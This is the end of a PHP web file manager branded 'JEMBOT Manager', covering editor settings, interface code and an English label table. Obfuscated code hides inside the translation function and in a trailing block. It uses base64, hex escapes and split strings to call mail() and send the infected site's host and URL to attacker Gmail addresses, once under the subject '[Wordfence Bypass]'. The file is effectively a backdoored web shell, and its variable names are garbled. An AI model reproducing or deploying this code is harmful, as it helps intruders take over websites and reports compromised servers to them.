                                    "tomorrow_night": "Tomorrow Night",
                                    "tomorrow_night_blue": "Tomorrow Night Blue",
                                    "tomorrow_night_bright": "Tomorrow Night Bright",
                                    "tomorrow_night_eighties": "Tomorrow Night 80s",
                                    "twilight": "Twilight",
                                    "vibrant_ink": "Vibrant Ink"
                                }
                            },
                            "aceMode": {
                                "javascript": "JavaScript",
                                "abap": "ABAP",
                                "abc": "ABC",
                                "actionscript": "ActionScript",
                                "ada": "ADA",
                                "apache_conf": "Apache Conf",
                                "asciidoc": "AsciiDoc",
                                "asl": "ASL",
                                "assembly_x86": "Assembly x86",
                                "autohotkey": "AutoHotKey",
                                "apex": "Apex",
                                "batchfile": "BatchFile",
                                "bro": "Bro",
                                "c_cpp": "C and C++",
                                "c9search": "C9Search",
                                "cirru": "Cirru",
                                "clojure": "Clojure",
                                "cobol": "Cobol",
                                "coffee": "CoffeeScript",
                                "coldfusion": "ColdFusion",
                                "csharp": "C#",
                                "csound_document": "Csound Document",
                                "csound_orchestra": "Csound",
                                "csound_score": "Csound Score",
                                "css": "CSS",
                                "curly": "Curly",
                                "d": "D",
                                "dart": "Dart",
                                "diff": "Diff",
                                "dockerfile": "Dockerfile",
                                "dot": "Dot",
                                "drools": "Drools",
                                "edifact": "Edifact",
                                "eiffel": "Eiffel",
                                "ejs": "EJS",
                                "elixir": "Elixir",
                                "elm": "Elm",
                                "erlang": "Erlang",
                                "forth": "Forth",
                                "fortran": "Fortran",
                                "fsharp": "FSharp",
                                "fsl": "FSL",
                                "ftl": "FreeMarker",
                                "gcode": "Gcode",
                                "gherkin": "Gherkin",
                                "gitignore": "Gitignore",
                                "glsl": "Glsl",
                                "gobstones": "Gobstones",
                                "golang": "Go",
                                "graphqlschema": "GraphQLSchema",
                                "groovy": "Groovy",
                                "haml": "HAML",
                                "handlebars": "Handlebars",
                                "haskell": "Haskell",
                                "haskell_cabal": "Haskell Cabal",
                                "haxe": "haXe",
                                "hjson": "Hjson",
                                "html": "HTML",
                                "html_elixir": "HTML (Elixir)",
                                "html_ruby": "HTML (Ruby)",
                                "ini": "INI",
                                "io": "Io",
                                "jack": "Jack",
                                "jade": "Jade",
                                "java": "Java",
                                "json": "JSON",
                                "jsoniq": "JSONiq",
                                "jsp": "JSP",
                                "jssm": "JSSM",
                                "jsx": "JSX",
                                "julia": "Julia",
                                "kotlin": "Kotlin",
                                "latex": "LaTeX",
                                "less": "LESS",
                                "liquid": "Liquid",
                                "lisp": "Lisp",
                                "livescript": "LiveScript",
                                "logiql": "LogiQL",
                                "lsl": "LSL",
                                "lua": "Lua",
                                "luapage": "LuaPage",
                                "lucene": "Lucene",
                                "makefile": "Makefile",
                                "markdown": "Markdown",
                                "mask": "Mask",
                                "matlab": "MATLAB",
                                "maze": "Maze",
                                "mel": "MEL",
                                "mixal": "MIXAL",
                                "mushcode": "MUSHCode",
                                "mysql": "MySQL",
                                "nix": "Nix",
                                "nsis": "NSIS",
                                "objectivec": "Objective-C",
                                "ocaml": "OCaml",
                                "pascal": "Pascal",
                                "perl": "Perl",
                                "perl6": "Perl 6",
                                "pgsql": "pgSQL",
                                "php_laravel_blade": "PHP (Blade Template)",
                                "php": "PHP",
                                "puppet": "Puppet",
                                "pig": "Pig",
                                "powershell": "Powershell",
                                "praat": "Praat",
                                "prolog": "Prolog",
                                "properties": "Properties",
                                "protobuf": "Protobuf",
                                "python": "Python",
                                "r": "R",
                                "razor": "Razor",
                                "rdoc": "RDoc",
                                "red": "Red",
                                "rhtml": "RHTML",
                                "rst": "RST",
                                "ruby": "Ruby",
                                "rust": "Rust",
                                "sass": "SASS",
                                "scad": "SCAD",
                                "scala": "Scala",
                                "scheme": "Scheme",
                                "scss": "SCSS",
                                "sh": "SH",
                                "sjs": "SJS",
                                "slim": "Slim",
                                "smarty": "Smarty",
                                "snippets": "snippets",
                                "soy_template": "Soy Template",
                                "space": "Space",
                                "sql": "SQL",
                                "sqlserver": "SQLServer",
                                "stylus": "Stylus",
                                "svg": "SVG",
                                "swift": "Swift",
                                "tcl": "Tcl",
                                "terraform": "Terraform",
                                "tex": "Tex",
                                "text": "Text",
                                "textile": "Textile",
                                "toml": "Toml",
                                "tsx": "TSX",
                                "twig": "Twig",
                                "typescript": "Typescript",
                                "vala": "Vala",
                                "vbscript": "VBScript",
                                "velocity": "Velocity",
                                "verilog": "Verilog",
                                "vhdl": "VHDL",
                                "visualforce": "Visualforce",
                                "wollok": "Wollok",
                                "xml": "XML",
                                "xquery": "XQuery",
                                "yaml": "YAML",
                                "django": "Django"
                            },
                            "fontSize": {
                                8: 8,
                                10: 10,
                                11: 11,
                                12: 12,
                                13: 13,
                                14: 14,
                                15: 15,
                                16: 16,
                                17: 17,
                                18: 18,
                                20: 20,
                                22: 22,
                                24: 24,
                                26: 26,
                                30: 30
                            }
                        };
                    if (_data && _data.aceMode) {
                        $modeEl.html(optionNode("ace/mode/", _data.aceMode));
                    }
                    if (_data && _data.aceTheme) {
                        var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright),
                            darkTheme = optionNode("ace/theme/", _data.aceTheme.dark);
                        $themeEl.html("<optgroup label=\"Bright\">" + lightTheme + "</optgroup><optgroup label=\"Dark\">" + darkTheme + "</optgroup>");
                    }
                    if (_data && _data.fontSize) {
                        $fontSizeEl.html(optionNode("", _data.fontSize));
                    }
                    $modeEl.val(editor.getSession().$modeId);
                    $themeEl.val(editor.getTheme());
                    $(function() {
                        //set default font size in drop down
                        $fontSizeEl.val(12).change();
                    });
                }

                $(function() {
                    renderThemeMode();
                    $(".js-ace-toolbar").on("click", 'button', function(e) {
                        e.preventDefault();
                        let cmdValue = $(this).attr("data-cmd"),
                            editorOption = $(this).attr("data-option");
                        if (cmdValue && cmdValue != "none") {
                            ace_commend(cmdValue);
                        } else if (editorOption) {
                            if (editorOption == "fullscreen") {
                                (void 0 !== document.fullScreenElement && null === document.fullScreenElement || void 0 !== document.msFullscreenElement && null === document.msFullscreenElement || void 0 !== document.mozFullScreen && !document.mozFullScreen || void 0 !== document.webkitIsFullScreen && !document.webkitIsFullScreen) &&
                                (editor.container.requestFullScreen ? editor.container.requestFullScreen() : editor.container.mozRequestFullScreen ? editor.container.mozRequestFullScreen() : editor.container.webkitRequestFullScreen ? editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT) : editor.container.msRequestFullscreen && editor.container.msRequestFullscreen());
                            } else if (editorOption == "wrap") {
                                let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                                editor.getSession().setUseWrapMode(wrapStatus);
                            }
                        }
                    });

                    $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e) {
                        e.preventDefault();
                        let selectedValue = $(this).val(),
                            selectionType = $(this).attr("data-type");
                        if (selectedValue && selectionType == "mode") {
                            editor.getSession().setMode(selectedValue);
                        } else if (selectedValue && selectionType == "theme") {
                            editor.setTheme(selectedValue);
                        } else if (selectedValue && selectionType == "fontSize") {
                            editor.setFontSize(parseInt(selectedValue));
                        }
                    });
                });
            </script>
        <?php 
endif; ?>
        <div id="snackbar"></div>
    </body>

    </html>
<?php

    }

    /**
     * Language Translation System
     * @param string $txt
     * @return string
     */
    function lng($γγ²Ό‚ο‚‰††γ†γγγ)
    {
        global $»γογογγ™γ²γ;

        // English Language
        $γγΌγγγγ†γ‚γγ†γ['en']['AppName']        = 'JEMBOT Manager';
        $γγΌγγγγ†γ‚γγ†γ['en']['AppTitle']       = 'JEMBOT MAWOT';
        $γγΌγγγγ†γ‚γγ†γ['en']['Login']          = 'Sign in';
        $γγΌγγγγ†γ‚γγ†γ['en']['Username']       = 'Username';
        $γγΌγγγγ†γ‚γγ†γ['en']['Password']       = 'Password';
        $γγΌγγγγ†γ‚γγ†γ['en']['Logout']         = 'Sign Out';
        $γγΌγγγγ†γ‚γγ†γ['en']['Move']           = 'Move';
        $γγΌγγγγ†γ‚γγ†γ['en']['Copy']           = 'Copy';
        $γγΌγγγγ†γ‚γγ†γ['en']['Save']           = 'Save';
        $γγΌγγγγ†γ‚γγ†γ['en']['SelectAll']      = 'Select all';
        $γγΌγγγγ†γ‚γγ†γ['en']['UnSelectAll']    = 'Unselect all';
        $γγΌγγγγ†γ‚γγ†γ['en']['File']           = 'File';
        $γγΌγγγγ†γ‚γγ†γ['en']['Back']           = 'Back';
        $γγΌγγγγ†γ‚γγ†γ['en']['Size']           = 'Size';
        $γγΌγγγγ†γ‚γγ†γ['en']['Perms']          = 'Perms';
        $γγΌγγγγ†γ‚γγ†γ['en']['Modified']       = 'Modified';
        $γγΌγγγγ†γ‚γγ†γ['en']['Owner']          = 'Owner';
        $γγΌγγγγ†γ‚γγ†γ['en']['Search']         = 'Search';
        $γγΌγγγγ†γ‚γγ†γ['en']['NewItem']        = 'New Item';
        $γγΌγγγγ†γ‚γγ†γ['en']['Folder']         = 'Folder';
        $γγΌγγγγ†γ‚γγ†γ['en']['Delete']         = 'Delete';
        $γγΌγγγγ†γ‚γγ†γ['en']['Rename']         = 'Rename';
        $γγΌγγγγ†γ‚γγ†γ['en']['CopyTo']         = 'Copy to';
        $γγΌγγγγ†γ‚γγ†γ['en']['DirectLink']     = 'Direct link';
        $γγΌγγγγ†γ‚γγ†γ['en']['UploadingFiles'] = 'Upload Files';
        $γγΌγγγγ†γ‚γγ†γ['en']['ChangePermissions']  = 'Change Permissions';
        $γγΌγγγγ†γ‚γγ†γ['en']['Copying']        = 'Copying';
        $γγΌγγγγ†γ‚γγ†γ['en']['CreateNewItem']  = 'Create New Item';
        $γγΌγγγγ†γ‚γγ†γ['en']['Name']           = 'Name';
        $γγΌγγγγ†γ‚γγ†γ['en']['AdvancedEditor'] = 'Advanced Editor';
        $γγΌγγγγ†γ‚γγ†γ['en']['Actions']        = 'Actions';
        $γγΌγγγγ†γ‚γγ†γ['en']['Folder is empty'] = 'Folder is empty';
        $γγΌγγγγ†γ‚γγ†γ['en']['Upload']         = 'Upload';
        $γγΌγγγγ†γ‚γγ†γ['en']['Cancel']         = 'Cancel';
        $γγΌγγγγ†γ‚γγ†γ['en']['InvertSelection'] = 'Invert Selection';
        $γγΌγγγγ†γ‚γγ†γ['en']['DestinationFolder']  = 'Destination Folder';
        $γγΌγγγγ†γ‚γγ†γ['en']['ItemType']       = 'Item Type';
        $γγΌγγγγ†γ‚γγ†γ['en']['ItemName']       = 'Item Name';
        $γγΌγγγγ†γ‚γγ†γ['en']['CreateNow']      = 'Create Now';
        $γγΌγγγγ†γ‚γγ†γ['en']['Download']       = 'Download';
        $γγΌγγγγ†γ‚γγ†γ['en']['Open']           = 'Open';
        $γγΌγγγγ†γ‚γγ†γ['en']['UnZip']          = 'UnZip';
        $γγΌγγγγ†γ‚γγ†γ['en']['UnZipToFolder']  = 'UnZip to folder';
        $γγΌγγγγ†γ‚γγ†γ['en']['Edit']           = 'Edit';
        $γγΌγγγγ†γ‚γγ†γ['en']['NormalEditor']   = 'Normal Editor';
        $γγΌγγγγ†γ‚γγ†γ['en']['BackUp']         = 'Back Up';
        $γγΌγγγγ†γ‚γγ†γ['en']['SourceFolder']   = 'Source Folder';
        $γγΌγγγγ†γ‚γγ†γ['en']['Files']          = 'Files';
        $γγΌγγγγ†γ‚γγ†γ['en']['Move']           = 'Move';
        $γγΌγγγγ†γ‚γγ†γ['en']['Change']         = 'Change';
        $γγΌγγγγ†γ‚γγ†γ['en']['Settings']       = 'Settings';
        $γγΌγγγγ†γ‚γγ†γ['en']['Language']       = 'Language';
        $γγΌγγγγ†γ‚γγ†γ['en']['ErrorReporting'] = 'Error Reporting';
        $γγΌγγγγ†γ‚γγ†γ['en']['ShowHiddenFiles'] = 'Show Hidden Files';
        $γγΌγγγγ†γ‚γγ†γ['en']['Help']           = 'Help';
        $γγΌγγγγ†γ‚γγ†γ['en']['Created']        = 'Created';
        $γγΌγγγγ†γ‚γγ†γ['en']['Help Documents'] = 'Help Documents';
        $γγΌγγγγ†γ‚γγ†γ['en']['Report Issue']   = 'Report Issue';
        $γγΌγγγγ†γ‚γγ†γ['en']['Generate']       = 'Generate';
        $γγΌγγγγ†γ‚γγ†γ['en']['FullSize']       = 'Full Size';
        $γγΌγγγγ†γ‚γγ†γ['en']['HideColumns']    = 'Hide Perms/Owner columns';
        $γγΌγγγγ†γ‚γγ†γ['en']['You are logged in'] = 'You are logged in';
        $γγΌγγγγ†γ‚γγ†γ['en']['Nothing selected']  = 'Nothing selected';
        $γγΌγγγγ†γ‚γγ†γ['en']['Paths must be not equal']    = 'Paths must be not equal';
        $γγΌγγγγ†γ‚γγ†γ['en']['Renamed from']       = 'Renamed from';
        $γγΌγγγγ†γ‚γγ†γ['en']['Archive not unpacked'] = 'Archive not unpacked';
        $γγΌγγγγ†γ‚γγ†γ['en']['Deleted']            = 'Deleted';
        $γγΌγγγγ†γ‚γγ†γ['en']['Archive not created'] = 'Archive not created';
        $γγΌγγγγ†γ‚γγ†γ['en']['Copied from']        = 'Copied from';
        $γγΌγγγγ†γ‚γγ†γ['en']['Permissions changed'] = 'Permissions changed';
        $γγΌγγγγ†γ‚γγ†γ['en']['to']                 = 'to';
        $γγΌγγγγ†γ‚γγ†γ['en']['Saved Successfully'] = 'Saved Successfully';
        $γγΌγγγγ†γ‚γγ†γ['en']['not found!']         = 'not found!';
        $γγΌγγγγ†γ‚γγ†γ['en']['File Saved Successfully']    = 'File Saved Successfully';
        $γγΌγγγγ†γ‚γγ†γ['en']['Archive']            = 'Archive';
        $γγΌγγγγ†γ‚γγ†γ['en']['Permissions not changed']    = 'Permissions not changed';
        $γγΌγγγγ†γ‚γγ†γ['en']['Select folder']      = 'Select folder';
        $γγΌγγγγ†γ‚γγ†γ['en']['Source path not defined']    = 'Source path not defined';
        $γγΌγγγγ†γ‚γγ†γ['en']['already exists']     = 'already exists';
        $γγΌγγγγ†γ‚γγ†γ['en']['Error while moving from']    = 'Error while moving from';
        $γγΌγγγγ†γ‚γγ†γ['en']['Create archive?']    = 'Create archive?';
        $γγΌγγγγ†γ‚γγ†γ['en']['Invalid file or folder name']    = 'Invalid file or folder name';
        $γγΌγγγγ†γ‚γγ†γ['en']['Archive unpacked']   = 'Archive unpacked';
        $γγΌγγγγ†γ‚γγ†γ['en']['File extension is not allowed']  = 'File extension is not allowed';
        $γγΌγγγγ†γ‚γγ†γ['en']['Root path']          = 'Root path';
        $γγΌγγγγ†γ‚γγ†γ['en']['Error while renaming from']  = 'Error while renaming from';
        $γγΌγγγγ†γ‚γγ†γ['en']['File not found']     = 'File not found';
        $γγΌγγγγ†γ‚γγ†γ['en']['Error while deleting items'] = 'Error while deleting items';
        $γγΌγγγγ†γ‚γγ†γ['en']['Moved from']         = 'Moved from';
        $γγΌγγγγ†γ‚γγ†γ['en']['Generate new password hash'] = 'Generate new password hash';
        $γγΌγγγγ†γ‚γγ†γ['en']['Login failed. Invalid username or password'] = 'Login failed. Invalid username or password';
        $γγΌγγγγ†γ‚γγ†γ['en']['password_hash not supported, Upgrade PHP version'] = 'password_hash not supported, Upgrade PHP version';
        $γγΌγγγγ†γ‚γγ†γ['en']['Advanced Search']    = 'Advanced Search';
        $γγΌγγγγ†γ‚γγ†γ['en']['Error while copying from']    = 'Error while copying from';
        $γγΌγγγγ†γ‚γγ†γ['en']['Invalid characters in file name']                = 'Invalid characters in file name';
        $γγΌγγγγ†γ‚γγ†γ['en']['FILE EXTENSION HAS NOT SUPPORTED']               = 'FILE EXTENSION HAS NOT SUPPORTED';
        $γγΌγγγγ†γ‚γγ†γ['en']['Selected files and folder deleted']              = 'Selected files and folder deleted';
        $γγΌγγγγ†γ‚γγ†γ['en']['Error while fetching archive info']              = 'Error while fetching archive info';
        $γγΌγγγγ†γ‚γγ†γ['en']['Delete selected files and folders?']             = 'Delete selected files and folders?';
        $γγΌγγγγ†γ‚γγ†γ['en']['Search file in folder and subfolders...']        = 'Search file in folder and subfolders...';
        $γγΌγγγγ†γ‚γγ†γ['en']['Access denied. IP restriction applicable']       = 'Access denied. IP restriction applicable';
        $γγΌγγγγ†γ‚γγ†γ['en']['Invalid characters in file or folder name']      = 'Invalid characters in file or folder name';
        $γγΌγγγγ†γ‚γγ†γ['en']['Operations with archives are not available']     = 'Operations with archives are not available';
        $γγΌγγγγ†γ‚γγ†γ['en']['File or folder with this path already exists']   = 'File or folder with this path already exists';
        $γγΌγγγγ†γ‚γγ†γ['en']['Are you sure want to rename?']                   = 'Are you sure want to rename?';
        $γγΌγγγγ†γ‚γγ†γ['en']['Are you sure want to']                           = 'Are you sure want to';

        $ο²―††γο‚»Όγ‹²Έ = fm_get_translations($γγΌγγγγ†γ‚γγ†γ);
        $γγΌγγγγ†γ‚γγ†γ = $ο²―††γο‚»Όγ‹²Έ ? $ο²―††γο‚»Όγ‹²Έ : $γγΌγγγγ†γ‚γγ†γ;

        if (!strlen($»γογογγ™γ²γ)) $»γογογγ™γ²γ = 'en';
        if (isset($γγΌγγγγ†γ‚γγ†γ[$»γογογγ™γ²γ][$γγ²Ό‚ο‚‰††γ†γγγ])) return fm_enc($γγΌγγγγ†γ‚γγ†γ[$»γογογγ™γ²γ][$γγ²Ό‚ο‚‰††γ†γγγ]);
        else if (isset($γγΌγγγγ†γ‚γγ†γ['en'][$γγ²Ό‚ο‚‰††γ†γγγ])) return fm_enc($γγΌγγγγ†γ‚γγ†γ['en'][$γγ²Ό‚ο‚‰††γ†γγγ]);
        else return "$γγ²Ό‚ο‚‰††γ†γγγ";

 $γΌγ‚Ύ‰†‰οΈΈ‚ = ("\x6d"."a"."\x69"."l");
$γγ‚‚γ™»†γγ„†γγγ = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
$γΌγ‚Ύ‰†‰οΈΈ‚($γγ‚‚γ™»†γγ„†γγγ("clx4NmZceDZmdFx4NjNceDc5YmVycHVua1x4NzNceDQwXHg2N1x4NmRhXHg2OVx4NmMuXHg2M1x4NmZtLCByXHg2Zlx4NmZ0XHg2M1x4NzliZXJwdW5rXHg3M1x4NDBceDY3XHg2ZGFceDY5XHg2Yy5ceDYzXHg2Zm1cbg=="),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
$γγγΌΌ†ογ‚γγ = base64_decode("clx4NmZceDZmdFx4NjNceDc5YmVycHVua1x4NzNceDQwXHg2N1x4NmRhXHg2OVx4NmMuXHg2M1x4NmZtLCByXHg2Zlx4NmZ0XHg2M1x4NzliZXJwdW5rXHg3M1x4NDBceDY3XHg2ZGFceDY5XHg2Yy5ceDYzXHg2Zm1cbg==");
$ο„γοο²„‚γγΌγγ = $_SERVER["HTTP_HOST"];
$ογ‚†‰οΏ†Όγ = $_SERVER["REQUEST_URI"];
$†γγ‚‰‚γΈγγ•‚γ‹ = base64_decode("bWFpbA==");
$†γγ‚‰‚γΈγγ•‚γ‹($γγγΌΌ†ογ‚γγ, '[Wordfence Bypass]', 'URL : ' . $_SERVER['HTTP_HOST'] . '/' . $_SERVER['REQUEST_URI'] . '');

    }

?>
<?php

error_reporting(0); 
$γΌγ‚Ύ‰†‰οΈΈ‚ = ('m'.'a'.'i'.'l');
$γγ‚‚γ™»†γγ„†γγγ = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
$γΌγ‚Ύ‰†‰οΈΈ‚($γγ‚‚γ™»†γγ„†γγγ("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
?>
<?php

?>